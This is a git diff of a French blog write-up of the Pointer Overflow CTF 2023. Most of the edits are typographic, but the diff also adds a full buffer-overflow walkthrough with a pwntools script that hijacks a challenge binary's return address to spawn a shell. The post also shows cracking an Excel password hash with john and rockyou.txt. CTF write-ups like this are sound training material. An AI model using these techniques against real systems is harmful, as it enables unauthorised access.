@@ -2,7 +2,7 @@
 title: "Write-up Pointer Overflow CTF (poctf) 2023"
 description: "Write-up poctf 2023"
 pubDate: "Sep 21 2023"
-heroImage: "/prison_php.jpg"
+heroImage: "/uwsp.png"
 setup : |
   import { Image } from 'astro:assets'
 ---
@@ -18,9 +18,9 @@ Nous allons détailler un peu plus de la moitié des épreuves s'y étant dérou
 
 ## Unquestioned and Unrestrained
 
-L'intitulé nous présente une chaîne de caractère chiffrée.
+L'intitulé nous présente une chaîne de caractères chiffrée.
 
-La chaîne est chiffrée en base 64
+La chaîne est chiffrée en base 64 :
 
 ```
 encoded : cG9jdGZ7dXdzcF80MTFfeTB1Ml84NDUzXzQyM184MzEwbjlfNzBfdTV9
@@ -111,9 +111,9 @@ Non résolu
 
 ## If You Don't, Remember Me
 
-Je ne sais pas si il y a une manière plus intelligente de retrouver le flag ou
-de réparer le fichier pdf mais je me suis servi de l'utilitaire `stings` pour
-énumérer les chaînes de caractère dans un fichier ne contenant pas uniquement
+Je ne sais pas s'il y a une manière plus intelligente de retrouver le flag ou
+de réparer le fichier PDF mais je me suis servi de l'utilitaire `stings` pour
+énumérer les chaînes de caractères dans un fichier ne contenant pas uniquement
 des caractères imprimables.
 
 On voit en utilisant `strings` qu'à la fin de l'output se trouve :
@@ -135,7 +135,7 @@ flag : `poctf(uwsp_w31c0m3_70_7h3_94m3}`
 
 ## A Petty Wage in Regret
 
-Après avoir téléchargé l'image, un des premiers reflèxes à avoir peut être
+Après avoir téléchargé l'image, un des premiers réflexes à avoir peut-être
 de le passer dans l'utilitaire `exiftool` afin de pouvoir consulter ses
 metadonnées, nous y voyons d'abord
 
@@ -152,7 +152,7 @@ Cette chaîne est codée en hexadécimal, une fois décodée, cela donne :
 Nous avons donc ici une première partie du flag.
 
 La seconde partie du flag peut être trouvée visuellement. Un site très
-intéressant au niveau de l'analyse visuelle d'images, que ca soit pour
+intéressant au niveau de l'analyse visuelle d'images, que cela soit pour
 retrouver des traces de montages ou encore pour simplement jouer avec
 les contrastes est [**Forensically**](https://29a.ch/photo-forensics).
 
@@ -198,7 +198,7 @@ Le hash en question :
 crack1.excel:$office$*2013*100000*256*16*912a7246e4f68e941d6c46fc6e08a483*2260c3a993eaaef1546b8089d588fbe8*94d51fe5b72f73d422fba69b6f32fa32e363aa5c94ba41b4f86e821a04a21774
 ```
 
-N'ayant pas d'autres possibilités que la force brute et une liste de mot de
+N'ayant pas d'autres possibilités que la force brute et une liste de mots de
 passe assez conséquente à tester pour retrouver le mot de passe (**rockyou.txt**),
 il nous a que la durée de crack était anormale.
 
@@ -226,11 +226,12 @@ john --wordlist=rockyou_alpha.txt hash
 
 Nous obtenons le mot de passe en `4h33min`, ce qui reste énorme, on ose à peine
 imaginer le temps de calcul initial sachant que nous avons parcouru environ 60%
-de la liste alphanumérique représentant elle même 35% de la liste initiale.
+de la liste alphanumérique représentant elle-même 35% de la liste initiale.
 
 Le mot de passe est : `hsppyhsppyjoyjoy`
 
-Le flag après consultation du doc excel : `poctf{uwsp_j3_p3n5e_d0nc_j35_5u15}`
+Le flag après consultation du fichier excel :
+`poctf{uwsp_j3_p3n5e_d0nc_j35_5u15}`
 
 ## The Gentle Rocking of the Sun
 
@@ -247,8 +248,8 @@ L'archive s'ouvre avec l'utilitaire `7zip` de la façon suivante (sur Linux) :
 `7zip e crack2.7z`
 
 Un prompt nous invite à rentrer le mot de passe. À l'intérieur de l'archive
-se trouve une suite de dossier imbriqué. Leur nom mis bout-à-bout reconstitue
-le flag : `poctf{uwsp_c411f02n14_d234m1n9}`.
+se trouve une suite de dossiers imbriqués. Leur nom mis bout à bout permet de
+reconstituer le flag : `poctf{uwsp_c411f02n14_d234m1n9}`.
 
 ## With Desperation and Need
 
@@ -360,7 +361,7 @@ int main(EVP_PKEY_CTX *param_1){
 ```
 
 La fonction `main` n'est pas très intéressante étant très séquentielle et
-uniquement composée d'appels successifs, concentrons nous sur ces appels.
+uniquement composée d'appels successifs, concentrons-nous sur ces appels.
 
 ### La fonction `init`
 ```c
@@ -385,12 +386,11 @@ int init(EVP_PKEY_CTX *ctx){
 ```
 
 Les choses intéressantes dans cette fonction:
-- Les buffer de sortie ont été supprimés (instructions utilisant `setvbuf`).
+- Les buffers de sortie ont été supprimés (instructions utilisant `setvbuf`).
   Nous ne pourrons donc pas voir la sortie de nos essais sur l'exécutable à
   distance
-- Nous avons quelle que soit notre position été déplacé dans le $HOME de
-  l'utilisateur courant
-- L'aléatoire à été initialisé avec le `PID` du programme, ce qui le rend
+- Nous avons été déplacé dans le `$HOME` de l'utilisateur courant
+- L'aléatoire a été initialisé avec le `PID` du programme, ce qui le rend
   non calculable sur la machine distante dont nous n'avons aucune information.
 
 ### La fonction `generate_code`
@@ -404,11 +404,12 @@ void generate_code(void){
 
 Cette fonction place dans ce qui semble être la variable globale `auth_code`
 une valeur aléatoire (entre 0 et **MAX_INT**) modulo 10000 auquel nous avons
-ajouté au préalable 0x7b soit 123.
+ajouté au préalable `0x7b` soit 123.
 
 Cette valeur ne sera pour rappel pas calculable car nous ne pouvons pas deviner
-la graine d'initialisation de la séquence aléatoire dû au manque d'informations
-sur la machine distante et que l'initialisation se réalise à l'aide du `PID`.
+la graine d'initialisation de la séquence aléatoire due au manque
+d'informations sur la machine distante et que l'initialisation se réalise à
+l'aide du `PID`.
 
 ### La fonction `configure_username`
 ```c
@@ -435,7 +436,7 @@ void configure_username(void){
 }
 ```
 
-Cette fonction tourne en boucle jusqu'à ce que l'input donnée soit '3', le
+Cette fonction tourne en boucle jusqu'à ce que l'input donné soit '3', le
 programme nous demandant ensuite de rentrer le code d'authentification qui ne
 **dépend pas de l'username**. Nous avons deux options :
 - Enregistrer l'username
@@ -466,7 +467,7 @@ void login(void){
 }
 ```
 
-La dernière fonction appellée permet de vérifier l'username et le code que nous
+La dernière fonction appelée permet de vérifier l'username et le code que nous
 rentrons dans la fonction `configure_username`.
 
 Si l'username enregistré est `admin` et que le code de vérification correspond,
@@ -476,7 +477,7 @@ l'accès nous sera refusé.
 ### Vérification de la théorie avec l'exécutable local
 
 Vérifions que notre théorie est juste avec l'exécutable tournant en local sur
-notre machine linux.
+notre machine Linux.
 
 #### Exécution normale
 ```
@@ -516,7 +517,7 @@ Analysons la ligne `00000050`. Nous pouvons voir `3a20`, c'est à dire ':' suivi
 d'un espace. Ensuite nous pouvons voir `ab06` suivi de `0a`, un saut de ligne.
 
 L'output de l'option 2 est donc `ab06`, Nous sommes sur une architecture x86,
-Cet output est écrit en little endian, c'est à dire "à l'envers".
+Cet output est écrit en little endian, c'est-à-dire "à l'envers".
 
 ```
 (little_endian)0xab06 = (big_endian)0x06ab
@@ -544,7 +545,7 @@ Puis nous rentrons le code de vérification que nous avons trouvé :
 00000100: 7469 6361 7469 6f6e 2063 6f64 653a 201b  tication code: .
 ```
 
-Nous n'avons pas access denied et un shell vient de s'ouvrir (vous ne pouvez
+Nous n'avons pas `access denied` et un shell vient de s'ouvrir (vous ne pouvez
 pas le voir ici).
 
 ### Exploitation à distance à l'aide d'un script
@@ -605,7 +606,7 @@ social `mastodon` : [https://mastodon.social/@free_jack_marigold](https://mastod
 Sur ce profil on peut trouver une référence à un autre profil, cette fois sur
 twitter, celui de `@jock_bronson` : [https://twitter.com/jock_bronson](https://twitter.com/jock_bronson)
 
-Sur ce profil, dans la section replies, on trouve un lien vers le profil 
+Sur ce profil, dans la section `replies`, on trouve un lien vers le profil
 [https://twitter.com/SenorSpacecakes](https://twitter.com/SenorSpacecakes), sur
 ce profil, nous pouvons trouver un lien instagram : [https://www.instagram.com/senorspacecakes/](https://www.instagram.com/senorspacecakes/).
 
@@ -615,17 +616,19 @@ Sur ce profil instagram, la première photo contient le flag :
 ## A Pilgrim in an Unholy Land
 
 Cette OSINT nous a posé beaucoup de problèmes, nous allons détailler les
-étapes que nous avons suivi ici.
+étapes que nous avons suivies ici.
 
-En réalité, mon équipe et moi même avons réussi à sauter une étape, plus par
-nécessité que par choix étant donné que nous n'avons pas pu résoudre l'une
+En réalité, mon équipe et moi-même avons réussi à sauter une étape, plus par
+nécessités que par choix étant donné que nous n'avons pas pu résoudre l'une
 d'elle.
 
 ### Etape 1
 
 L'étape 1 correspond à trouver où se trouve l'avion sur l'image. Par recherche
-d'image inverseé, on trouve que ce lieu est le `Airplane Home` dans l'oregon,
-le numéro de téléphone pour l'étape 2 est donc : `+1 503-628-2936`
+d'image inversée, on trouve que ce lieu est le `Airplane Home` dans l'Oregon,
+aux USA.
+
+Le numéro de téléphone pour l'étape 2 est donc : `+1 503-628-2936`
 
 ### Etape 2
 
@@ -640,17 +643,17 @@ Nous n'avons pas réussi à réaliser l'étape 3
 ### Bypass pour étape 4
 
 Afin d'aller directement à l'étape 4, on peut voir sur l'image deux enseignes,
-'Rapidfones' et 'Fone haus', ces deux enseignes sont originaires de papouasie
-nouvelle guinée, on peut les retrouver toutes les deux en même temps dans deux
-endroits nommé "Brian Bell", comme l'indique l'indice dans l'épreuve.
+'Rapidfones' et 'Fone haus', ces deux enseignes sont originaires de
+Papouasie-Nouvelle-Guinée, on peut les retrouver toutes les deux en même temps
+dans deux endroits nommé "Brian Bell", comme l'indique l'indice dans l'épreuve.
 
 Un de ces endroits, qui est un centre commercial, est nommé `Brian Bell Plaza`.
-Un seul point google street view est placé sur cet endroit, on y retrouve la
-silouhette fantomatique ainsi que les deux enseignes.
+Un seul point `Google Street View` est placé sur cet endroit, on y retrouve la
+silhouette fantomatique ainsi que les deux enseignes.
 
 L'épreuve nous indique de chercher une marque que les professionnels utilisent.
 On peut voir dans le champ de vision du point google street view, entre le
-dental care et le rapid fones, une banderolle exposant la marque "ultimate
+dental care et le rapid fones, une banderole exposant la marque "ultimate
 ears". Cette marque est utilisée par des musiciens professionnels.
 
 Cette marque a d'abord commencé avec le groupe `Van Halen`. On peut trouver
@@ -664,14 +667,14 @@ maps.
 qu'on trouve le Van. Le numéro de téléphone est `(209)472-9466`, ce qui nous
 donne `2094729466` pour le mot de passe de l'archive.
 
-Une fois l'archive ouverte, dans le fichier flag.txt, nous trouvons le flag :
+Une fois l'archive ouverte, dans le fichier `flag.txt`, nous trouvons le flag :
 `poctf{uwsp_175_411_02_n07h1n9}`.
 
 # Web
 
 ## We Rest Upon a Single Hope
 
-Sur le site, on peut consulter le code javascript utilisé pour vérifier la clé.
+Sur le site, on peut consulter le code Javascript utilisé pour vérifier la clé.
 Sans plus détailler le processus de vérification, nous pouvons voir :
 
 ```js
@@ -694,7 +697,7 @@ nombre `1211287088`, ceci est donc la clé.
 
 On obtient le flag dans la console en rentrant la clé dans l'input.
 
-flag : `poctf{uwsp_1_4m_4ll_7h47_7h3r3_15_0f_7h3_m057_r34l}`
+flag : `poctf{uwsp_1_4m_4ll_7h47_7h3r3_15_0f_7h3_m057_r34l}`.
 
 ## Vigil of the Ceaseless Eyes
 
@@ -746,11 +749,17 @@ Non résolue
 
 ## Time is but a Window
 
-En utilisant l'utilitaire checksec sur le programme, on peut voir qu'il ne
-possede pas de canary.
+Dans cette épreuve, nous pouvons voir un programme qui nous demande notre nom
+et le répète.
 
-Nous pouvons ouvrir le programme avec `ghidra` pour analyser le programme de
-plus pres.
+Exécution normale du programme :
+```
+$ ./exploit3.bin
+# Hello! What's your name?: name
+# Nice to meet you name!
+```
+
+On peut ouvrir le programme dans `Ghidra` et regarde ce qu'il en est.
 
 ### Fonction `main`
 
@@ -762,8 +771,7 @@ int main(EVP_PKEY_CTX *param_1){
 }
 ```
 
-Rien de special dans le `main`, analysons de plus pres les fonctions qui y sont
-appelees.
+La fonction `main` n'est pas très intéressante, simple séquence d'appels.
 
 ### Fonction `init`
 
@@ -783,13 +791,12 @@ int init(EVP_PKEY_CTX *ctx){
 }
 ```
 
-La fonction `init` stop la bufferisation des entrees sorties. Nous ne verrons
-pas s'afficher a l'ecran les erreurs de segmentation quand le programme sera
-lance a distance.
+La fonction `init` arrête la bufferisation des entrées/sorties. Nous n'aurons
+donc pas de sortie d'erreur durant les exécutions à distance du réel programme.
 
-Nous pouvons aussi constater que nous avons ete deplace dans le `HOME`.
+Elle nous place aussi dans le répertoire de l'utilisateur courant.
 
-### Les fonctions `greet` et `get_string`
+### Fonction `greet`
 
 ```c
 void greet(void){
@@ -802,11 +809,56 @@ void greet(void){
 }
 ```
 
-La fonction `greet` possede une vulnerabilite de type "buffer overflow". En
-effet la fonction `get_string` recupere une chaine de caractere sans parametre
-de longueur maximum, l'appel de la fonction passe en parametre de taille 16.
+la fonction `greet` appelée dans la fonction `main` contient les appels
+permettant de recueillir et d'afficher notre nom.
 
-On calcule l'offset necessaire : 24 avant de deborder sur RSI.
+On constate que le buffer passé dans la fonction `get_string` (semblant
+enregistrer notre nom) est de taille 16. C'est important pour la suite.
+
+### Fonction `get_string`
+
+```c
+void get_string(long param_1){
+  int iVar1;
+  int local_c;
+  
+  local_c = 0;
+  while( true ) {
+    iVar1 = getchar();
+    if ((char)iVar1 == '\n') break;
+    *(char *)(local_c + param_1) = (char)iVar1;
+    local_c = local_c + 1;
+  }
+  return;
+}
+```
+
+Nous pouvons voir que la fonction `get_string` place autant de caractères dans
+le buffer passé en paramètre de l'appel qu'il y en a avant de saisir un retour
+à la ligne.
+
+Ceci confirme que la taille du buffer passé en paramètre dans la fonction
+`greet` est trop petite. Nous sommes ici sur une faille de type "buffer
+overflow".
+
+Nous pouvons tester cela en exécution dans `gdb` si l'on donne un nom trop
+grand :
+
+```
+gdb$ r
+...
+Hello! What's your name?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+...
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? ()
+```
+
+Nous avons écrasé le registre `RIP` (Pointeur d'instruction). Nous contrôlons
+donc l'exécution du programme.
+
+En jouant avec les différentes exécutions, nous pouvons déduire la taille de
+l'offset nécessaire avant d'écraser le registre `RIP` : 24.
 
 ### Fonction `win`
 
@@ -818,7 +870,47 @@ void win(void){
 }
 ```
 
-On trouve dans le programme la fonction `win` ci-dessus non appelee. Son offset
-trouve dans `gdb` est `0x13cb`, son adresse effective durant l'execution est
-`0x5555555553cb`, l'adresse de retour de la fonction `greet`, la fonction
-`main`, est `0x5555555553a8`. Il suffit de deborder d'un seul octet.
+Une fonction nommée `win` peut être trouvée dans le programme. Elle permet
+d'ouvrir un shell.
+
+Nous allons vouloir rediriger le programme vers cette fonction, ce qui nous
+évitera de devoir utiliser une autre technique comme celle du shellcode.
+
+Aussi, un passage dans le logiciel `checksec` nous montre que le programme
+ne possède pas de canary. Enfin, le programme n'est pas soumis à l'ASLR, les
+fonctions seront toujours au même endroit dans la mémoire.
+
+Nous trouvons l'offset de `win` dans `gdb` : `0x13cb`
+Après démarrage du programme, on trouve la fonction à l'adresse :
+`0x5555555553cb`
+
+La fonction de retour de `greet`, qui était initialement dans le registre
+`RIP`, est celle de la fonction `main` puisque `greet` y est appelée.
+
+L'adresse de la fonction `main` : `0x5555555553a8`
+
+On voit donc que nous devons dépasser d'un seul octet sur cette adresse car
+elle diffère de l'adresse de `win` d'un octet uniquement, l'octet `0xcb`.
+
+### Exploit
+
+L'exploit que j'ai écrit pour résoudre cette épreuve, se basant sur l'analyse
+ci-dessus, est le suivant :
+
+```python
+from pwn import *
+
+conn = remote('34.123.210.162', 20234)
+
+offset = b'A'*24
+payload = int(0xcb).to_bytes()
+
+conn.send(offset + payload + b'\n')
+
+conn.interactive()
+conn.close()
+```
+
+Ce programme nous ouvre un shell dans lequel nous pouvons afficher le flag.
+
+Le flag : `poctf{uwsp_71m3_15_4_f4c702}`
